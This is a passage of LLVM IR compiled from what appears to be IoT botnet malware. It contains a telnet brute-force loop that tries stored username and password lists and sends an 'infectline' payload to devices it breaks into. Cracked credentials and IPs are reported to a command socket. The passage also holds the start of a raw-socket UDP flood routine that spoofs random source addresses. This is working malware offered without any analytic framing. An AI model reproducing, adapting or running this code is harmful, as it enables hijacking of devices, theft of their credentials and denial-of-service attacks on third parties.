  %716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %715
  %717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %716, i32 0, i32 0
  %718 = load i32, i32* %717, align 16
  %719 = load i32, i32* %2, align 4
  %720 = sext i32 %719 to i64
  %721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %720
  %722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %721, i32 0, i32 5
  %723 = load i8, i8* %722, align 1
  %724 = zext i8 %723 to i64
  %725 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %724
  %726 = load i8*, i8** %725, align 8
  %727 = load i32, i32* %2, align 4
  %728 = sext i32 %727 to i64
  %729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %728
  %730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %729, i32 0, i32 5
  %731 = load i8, i8* %730, align 1
  %732 = zext i8 %731 to i64
  %733 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %732
  %734 = load i8*, i8** %733, align 8
  %735 = call i64 @strlen(i8* %734) #11
  %736 = call i64 @send(i32 %718, i8* %726, i64 %735, i32 16384)
  %737 = icmp slt i64 %736, 0
  br i1 %737, label %738, label %753

738:                                              ; preds = %713
  %739 = load i32, i32* %2, align 4
  %740 = sext i32 %739 to i64
  %741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %740
  %742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %741, i32 0, i32 0
  %743 = load i32, i32* %742, align 16
  %744 = call i32 @sclose(i32 %743)
  %745 = load i32, i32* %2, align 4
  %746 = sext i32 %745 to i64
  %747 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %746
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %747, i32 0, i32 2
  store i8 0, i8* %748, align 8
  %749 = load i32, i32* %2, align 4
  %750 = sext i32 %749 to i64
  %751 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %750
  %752 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %751, i32 0, i32 3
  store i8 1, i8* %752, align 1
  br label %1075

753:                                              ; preds = %713
  %754 = load i32, i32* %2, align 4
  %755 = sext i32 %754 to i64
  %756 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %755
  %757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %756, i32 0, i32 0
  %758 = load i32, i32* %757, align 16
  %759 = call i64 @send(i32 %758, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i64 2, i32 16384)
  %760 = icmp slt i64 %759, 0
  br i1 %760, label %761, label %776

761:                                              ; preds = %753
  %762 = load i32, i32* %2, align 4
  %763 = sext i32 %762 to i64
  %764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %763
  %765 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %764, i32 0, i32 0
  %766 = load i32, i32* %765, align 16
  %767 = call i32 @sclose(i32 %766)
  %768 = load i32, i32* %2, align 4
  %769 = sext i32 %768 to i64
  %770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %769
  %771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %770, i32 0, i32 2
  store i8 0, i8* %771, align 8
  %772 = load i32, i32* %2, align 4
  %773 = sext i32 %772 to i64
  %774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %773
  %775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %774, i32 0, i32 3
  store i8 1, i8* %775, align 1
  br label %1075

776:                                              ; preds = %753
  %777 = load i32, i32* %2, align 4
  %778 = sext i32 %777 to i64
  %779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %778
  %780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %779, i32 0, i32 2
  store i8 6, i8* %780, align 8
  br label %1074

781:                                              ; preds = %69
  %782 = load i32, i32* %2, align 4
  %783 = sext i32 %782 to i64
  %784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %783
  %785 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %784, i32 0, i32 6
  %786 = load i32, i32* %785, align 4
  %787 = icmp eq i32 %786, 0
  br i1 %787, label %788, label %794

788:                                              ; preds = %781
  %789 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %790 = load i32, i32* %2, align 4
  %791 = sext i32 %790 to i64
  %792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %791
  %793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %792, i32 0, i32 6
  store i32 %789, i32* %793, align 4
  br label %794

794:                                              ; preds = %788, %781
  %795 = load i32, i32* %2, align 4
  %796 = sext i32 %795 to i64
  %797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %796
  %798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %797, i32 0, i32 0
  %799 = load i32, i32* %798, align 16
  %800 = load i32, i32* %2, align 4
  %801 = sext i32 %800 to i64
  %802 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %801
  %803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %802, i32 0, i32 8
  %804 = load i8*, i8** %803, align 8
  %805 = load i32, i32* %2, align 4
  %806 = sext i32 %805 to i64
  %807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %806
  %808 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %807, i32 0, i32 7
  %809 = load i16, i16* %808, align 16
  %810 = zext i16 %809 to i32
  %811 = call i32 @readUntil(i32 %799, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.78, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %804, i32 1024, i32 %810)
  %812 = icmp ne i32 %811, 0
  br i1 %812, label %813, label %888

813:                                              ; preds = %794
  %814 = load i32, i32* %2, align 4
  %815 = sext i32 %814 to i64
  %816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %815
  %817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %816, i32 0, i32 6
  store i32 0, i32* %817, align 4
  %818 = load i32, i32* %2, align 4
  %819 = sext i32 %818 to i64
  %820 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %819
  %821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %820, i32 0, i32 7
  store i16 0, i16* %821, align 16
  %822 = load i32, i32* %2, align 4
  %823 = sext i32 %822 to i64
  %824 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %823
  %825 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %824, i32 0, i32 8
  %826 = load i8*, i8** %825, align 8
  %827 = call i8* @strstr(i8* %826, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.78, i64 0, i64 0)) #11
  %828 = icmp ne i8* %827, null
  br i1 %828, label %829, label %849

829:                                              ; preds = %813
  %830 = load i32, i32* %2, align 4
  %831 = sext i32 %830 to i64
  %832 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %831
  %833 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %832, i32 0, i32 8
  %834 = load i8*, i8** %833, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %834, i8 0, i64 1024, i1 false)
  %835 = load i32, i32* %2, align 4
  %836 = sext i32 %835 to i64
  %837 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %836
  %838 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %837, i32 0, i32 0
  %839 = load i32, i32* %838, align 16
  %840 = call i32 @sclose(i32 %839)
  %841 = load i32, i32* %2, align 4
  %842 = sext i32 %841 to i64
  %843 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %842
  %844 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %843, i32 0, i32 2
  store i8 0, i8* %844, align 8
  %845 = load i32, i32* %2, align 4
  %846 = sext i32 %845 to i64
  %847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %846
  %848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %847, i32 0, i32 3
  store i8 0, i8* %848, align 1
  br label %1075

849:                                              ; preds = %813
  %850 = load i32, i32* %2, align 4
  %851 = sext i32 %850 to i64
  %852 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %851
  %853 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %852, i32 0, i32 8
  %854 = load i8*, i8** %853, align 8
  %855 = call i32 @matchPrompt(i8* %854)
  %856 = icmp ne i32 %855, 0
  br i1 %856, label %877, label %857

857:                                              ; preds = %849
  %858 = load i32, i32* %2, align 4
  %859 = sext i32 %858 to i64
  %860 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %859
  %861 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %860, i32 0, i32 8
  %862 = load i8*, i8** %861, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %862, i8 0, i64 1024, i1 false)
  %863 = load i32, i32* %2, align 4
  %864 = sext i32 %863 to i64
  %865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %864
  %866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %865, i32 0, i32 0
  %867 = load i32, i32* %866, align 16
  %868 = call i32 @sclose(i32 %867)
  %869 = load i32, i32* %2, align 4
  %870 = sext i32 %869 to i64
  %871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %870
  %872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %871, i32 0, i32 2
  store i8 0, i8* %872, align 8
  %873 = load i32, i32* %2, align 4
  %874 = sext i32 %873 to i64
  %875 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %874
  %876 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %875, i32 0, i32 3
  store i8 1, i8* %876, align 1
  br label %1075

877:                                              ; preds = %849
  %878 = load i32, i32* %2, align 4
  %879 = sext i32 %878 to i64
  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %879
  %881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %880, i32 0, i32 2
  store i8 7, i8* %881, align 8
  br label %882

882:                                              ; preds = %877
  %883 = load i32, i32* %2, align 4
  %884 = sext i32 %883 to i64
  %885 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %884
  %886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %885, i32 0, i32 8
  %887 = load i8*, i8** %886, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %887, i8 0, i64 1024, i1 false)
  br label %1075

888:                                              ; preds = %794
  %889 = load i32, i32* %2, align 4
  %890 = sext i32 %889 to i64
  %891 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %890
  %892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %891, i32 0, i32 8
  %893 = load i8*, i8** %892, align 8
  %894 = call i64 @strlen(i8* %893) #11
  %895 = trunc i64 %894 to i16
  %896 = load i32, i32* %2, align 4
  %897 = sext i32 %896 to i64
  %898 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %897
  %899 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %898, i32 0, i32 7
  store i16 %895, i16* %899, align 16
  br label %900

900:                                              ; preds = %888
  %901 = load i32, i32* %2, align 4
  %902 = sext i32 %901 to i64
  %903 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %902
  %904 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %903, i32 0, i32 6
  %905 = load i32, i32* %904, align 4
  %906 = add i32 %905, 30
  %907 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %908 = icmp ult i32 %906, %907
  br i1 %908, label %909, label %924

909:                                              ; preds = %900
  %910 = load i32, i32* %2, align 4
  %911 = sext i32 %910 to i64
  %912 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %911
  %913 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %912, i32 0, i32 0
  %914 = load i32, i32* %913, align 16
  %915 = call i32 @sclose(i32 %914)
  %916 = load i32, i32* %2, align 4
  %917 = sext i32 %916 to i64
  %918 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %917
  %919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %918, i32 0, i32 2
  store i8 0, i8* %919, align 8
  %920 = load i32, i32* %2, align 4
  %921 = sext i32 %920 to i64
  %922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %921
  %923 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %922, i32 0, i32 3
  store i8 1, i8* %923, align 1
  br label %924

924:                                              ; preds = %909, %900
  br label %1074

925:                                              ; preds = %69
  %926 = load i32, i32* %2, align 4
  %927 = sext i32 %926 to i64
  %928 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %927
  %929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %928, i32 0, i32 0
  %930 = load i32, i32* %929, align 16
  %931 = call i64 @send(i32 %930, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.79, i64 0, i64 0), i64 4, i32 16384)
  %932 = icmp slt i64 %931, 0
  br i1 %932, label %933, label %948

933:                                              ; preds = %925
  %934 = load i32, i32* %2, align 4
  %935 = sext i32 %934 to i64
  %936 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %935
  %937 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %936, i32 0, i32 0
  %938 = load i32, i32* %937, align 16
  %939 = call i32 @sclose(i32 %938)
  %940 = load i32, i32* %2, align 4
  %941 = sext i32 %940 to i64
  %942 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %941
  %943 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %942, i32 0, i32 2
  store i8 0, i8* %943, align 8
  %944 = load i32, i32* %2, align 4
  %945 = sext i32 %944 to i64
  %946 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %945
  %947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %946, i32 0, i32 3
  store i8 1, i8* %947, align 1
  br label %1075

948:                                              ; preds = %925
  %949 = load i32, i32* %2, align 4
  %950 = sext i32 %949 to i64
  %951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %950
  %952 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %951, i32 0, i32 2
  store i8 8, i8* %952, align 8
  br label %1074

953:                                              ; preds = %69
  %954 = load i32, i32* %2, align 4
  %955 = sext i32 %954 to i64
  %956 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %955
  %957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %956, i32 0, i32 6
  %958 = load i32, i32* %957, align 4
  %959 = icmp eq i32 %958, 0
  br i1 %959, label %960, label %966

960:                                              ; preds = %953
  %961 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %962 = load i32, i32* %2, align 4
  %963 = sext i32 %962 to i64
  %964 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %963
  %965 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %964, i32 0, i32 6
  store i32 %961, i32* %965, align 4
  br label %966

966:                                              ; preds = %960, %953
  %967 = load i32, i32* %2, align 4
  %968 = sext i32 %967 to i64
  %969 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %968
  %970 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %969, i32 0, i32 0
  %971 = load i32, i32* %970, align 16
  %972 = load i8*, i8** @infectline, align 8
  %973 = load i8*, i8** @infectline, align 8
  %974 = call i64 @strlen(i8* %973) #11
  %975 = call i64 @send(i32 %971, i8* %972, i64 %974, i32 16384)
  %976 = icmp slt i64 %975, 0
  br i1 %976, label %977, label %997

977:                                              ; preds = %966
  %978 = load i32, i32* %2, align 4
  %979 = sext i32 %978 to i64
  %980 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %979
  %981 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %980, i32 0, i32 0
  %982 = load i32, i32* %981, align 16
  %983 = call i32 @sclose(i32 %982)
  %984 = load i32, i32* %2, align 4
  %985 = sext i32 %984 to i64
  %986 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %985
  %987 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %986, i32 0, i32 2
  store i8 0, i8* %987, align 8
  %988 = load i32, i32* %2, align 4
  %989 = sext i32 %988 to i64
  %990 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %989
  %991 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %990, i32 0, i32 3
  store i8 1, i8* %991, align 1
  %992 = load i32, i32* %2, align 4
  %993 = sext i32 %992 to i64
  %994 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %993
  %995 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %994, i32 0, i32 8
  %996 = load i8*, i8** %995, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %996, i8 0, i64 1024, i1 false)
  br label %1075

997:                                              ; preds = %966
  %998 = load i32, i32* @mainCommSock, align 4
  %999 = load i32, i32* %2, align 4
  %1000 = sext i32 %999 to i64
  %1001 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1000
  %1002 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1001, i32 0, i32 1
  %1003 = bitcast i32* %1002 to %struct.in_addr*
  %1004 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1003, i32 0, i32 0
  %1005 = load i32, i32* %1004, align 4
  %1006 = call i8* @inet_ntoa(i32 %1005) #12
  %1007 = load i32, i32* %2, align 4
  %1008 = sext i32 %1007 to i64
  %1009 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1008
  %1010 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1009, i32 0, i32 4
  %1011 = load i8, i8* %1010, align 2
  %1012 = zext i8 %1011 to i64
  %1013 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %1012
  %1014 = load i8*, i8** %1013, align 8
  %1015 = load i32, i32* %2, align 4
  %1016 = sext i32 %1015 to i64
  %1017 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1016
  %1018 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1017, i32 0, i32 5
  %1019 = load i8, i8* %1018, align 1
  %1020 = zext i8 %1019 to i64
  %1021 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %1020
  %1022 = load i8*, i8** %1021, align 8
  %1023 = call i32 (i32, i8*, ...) @sockprintf(i32 %998, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.80, i64 0, i64 0), i8* %1006, i8* %1014, i8* %1022)
  %1024 = load i32, i32* %2, align 4
  %1025 = sext i32 %1024 to i64
  %1026 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1025
  %1027 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1026, i32 0, i32 6
  %1028 = load i32, i32* %1027, align 4
  %1029 = add i32 %1028, 8
  %1030 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1031 = icmp ult i32 %1029, %1030
  br i1 %1031, label %1032, label %1073

1032:                                             ; preds = %997
  %1033 = load i32, i32* @mainCommSock, align 4
  %1034 = load i32, i32* %2, align 4
  %1035 = sext i32 %1034 to i64
  %1036 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1035
  %1037 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1036, i32 0, i32 1
  %1038 = bitcast i32* %1037 to %struct.in_addr*
  %1039 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1038, i32 0, i32 0
  %1040 = load i32, i32* %1039, align 4
  %1041 = call i8* @inet_ntoa(i32 %1040) #12
  %1042 = load i32, i32* %2, align 4
  %1043 = sext i32 %1042 to i64
  %1044 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1043
  %1045 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1044, i32 0, i32 4
  %1046 = load i8, i8* %1045, align 2
  %1047 = zext i8 %1046 to i64
  %1048 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %1047
  %1049 = load i8*, i8** %1048, align 8
  %1050 = load i32, i32* %2, align 4
  %1051 = sext i32 %1050 to i64
  %1052 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1051
  %1053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1052, i32 0, i32 5
  %1054 = load i8, i8* %1053, align 1
  %1055 = zext i8 %1054 to i64
  %1056 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %1055
  %1057 = load i8*, i8** %1056, align 8
  %1058 = call i32 (i32, i8*, ...) @sockprintf(i32 %1033, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.81, i64 0, i64 0), i8* %1041, i8* %1049, i8* %1057)
  %1059 = load i32, i32* %2, align 4
  %1060 = sext i32 %1059 to i64
  %1061 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1060
  %1062 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1061, i32 0, i32 0
  %1063 = load i32, i32* %1062, align 16
  %1064 = call i32 @sclose(i32 %1063)
  %1065 = load i32, i32* %2, align 4
  %1066 = sext i32 %1065 to i64
  %1067 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1066
  %1068 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1067, i32 0, i32 2
  store i8 0, i8* %1068, align 8
  %1069 = load i32, i32* %2, align 4
  %1070 = sext i32 %1069 to i64
  %1071 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1070
  %1072 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1071, i32 0, i32 3
  store i8 1, i8* %1072, align 1
  br label %1073

1073:                                             ; preds = %1032, %997
  br label %1074

1074:                                             ; preds = %69, %1073, %948, %924, %776, %712, %558, %494, %394, %232
  br label %1075

1075:                                             ; preds = %1074, %977, %933, %882, %857, %829, %761, %738, %661, %647, %543, %520, %440, %319, %185, %141
  %1076 = load i32, i32* %2, align 4
  %1077 = add nsw i32 %1076, 1
  store i32 %1077, i32* %2, align 4
  br label %65, !llvm.loop !38

1078:                                             ; preds = %65
  br label %63
}

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

declare i32 @time(...) #5

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @sendUDP(i8* %0, i32 %1, i32 %2, i32 %3, i32 %4, i32 %5) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i64, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.udphdr*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %25, align 4
  %26 = load i32, i32* %8, align 4
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %32

28:                                               ; preds = %6
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  br label %37

32:                                               ; preds = %6
  %33 = load i32, i32* %8, align 4
  %34 = trunc i32 %33 to i16
  %35 = call zeroext i16 @htons(i16 zeroext %34) #15
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  br label %37

37:                                               ; preds = %32, %28
  %38 = load i8*, i8** %7, align 8
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %40 = call i32 @getHost(i8* %38, %struct.in_addr* %39)
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %43

42:                                               ; preds = %37
  br label %202

43:                                               ; preds = %37
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %45 = getelementptr inbounds [8 x i8], [8 x i8]* %44, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %45, i8 0, i64 8, i1 false)
  %46 = load i32, i32* %11, align 4
  store i32 %46, i32* %14, align 4
  %47 = call i32 @socket(i32 2, i32 3, i32 17) #12
  store i32 %47, i32* %15, align 4
  %48 = load i32, i32* %15, align 4
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %51, label %50

50:                                               ; preds = %43
  br label %202

51:                                               ; preds = %43
  store i32 1, i32* %16, align 4
  %52 = load i32, i32* %15, align 4
  %53 = bitcast i32* %16 to i8*
  %54 = call i32 @setsockopt(i32 %52, i32 0, i32 3, i8* %53, i32 4) #12
  %55 = icmp slt i32 %54, 0
  br i1 %55, label %56, label %57

56:                                               ; preds = %51
  br label %202

57:                                               ; preds = %51
  store i32 50, i32* %17, align 4
  br label %58

58:                                               ; preds = %62, %57
  %59 = load i32, i32* %17, align 4
  %60 = add nsw i32 %59, -1
  store i32 %60, i32* %17, align 4
  %61 = icmp ne i32 %59, 0
  br i1 %61, label %62, label %67

62:                                               ; preds = %58
  %63 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %64 = call i32 @rand_cmwc()
  %65 = xor i32 %63, %64
  call void @srand(i32 %65) #12
  %66 = call i32 @rand() #12
  call void @init_rand(i32 %66)
  br label %58, !llvm.loop !39

67:                                               ; preds = %58
  %68 = load i32, i32* %12, align 4
  %69 = sub nsw i32 32, %68
  %70 = shl i32 1, %69
  %71 = sub nsw i32 %70, 1
  %72 = xor i32 %71, -1
  store i32 %72, i32* %18, align 4
  %73 = load i32, i32* %10, align 4
  %74 = sext i32 %73 to i64
  %75 = add i64 28, %74
  %76 = call i8* @llvm.stacksave()
  store i8* %76, i8** %19, align 8
  %77 = alloca i8, i64 %75, align 16
  store i64 %75, i64* %20, align 8
  %78 = bitcast i8* %77 to %struct.iphdr*
  store %struct.iphdr* %78, %struct.iphdr** %21, align 8
  %79 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %80 = bitcast %struct.iphdr* %79 to i8*
  %81 = getelementptr i8, i8* %80, i64 20
  %82 = bitcast i8* %81 to %struct.udphdr*
  store %struct.udphdr* %82, %struct.udphdr** %22, align 8
  %83 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %84 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %85 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %84, i32 0, i32 0
  %86 = load i32, i32* %85, align 4
  %87 = load i32, i32* %18, align 4
  %88 = call i32 @getRandomIP(i32 %87)
  %89 = call i32 @htonl(i32 %88) #15
  %90 = load i32, i32* %10, align 4
  %91 = sext i32 %90 to i64
  %92 = add i64 8, %91
  %93 = trunc i64 %92 to i32
  call void @makeIPPacket(%struct.iphdr* %83, i32 %86, i32 %89, i8 zeroext 17, i32 %93)
  %94 = load i32, i32* %10, align 4
  %95 = sext i32 %94 to i64
  %96 = add i64 8, %95
  %97 = trunc i64 %96 to i16
  %98 = call zeroext i16 @htons(i16 zeroext %97) #15
  %99 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %100 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %99, i32 0, i32 0
  %101 = bitcast %union.anon.1* %100 to %struct.anon.3*
  %102 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %101, i32 0, i32 2
  store i16 %98, i16* %102, align 2
  %103 = call i32 @rand_cmwc()
  %104 = trunc i32 %103 to i16
  %105 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %106 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %105, i32 0, i32 0
  %107 = bitcast %union.anon.1* %106 to %struct.anon.3*
  %108 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %107, i32 0, i32 0
  store i16 %104, i16* %108, align 2
  %109 = load i32, i32* %8, align 4
  %110 = icmp eq i32 %109, 0
  br i1 %110, label %111, label %113

111:                                              ; preds = %67
  %112 = call i32 @rand_cmwc()
  br label %118

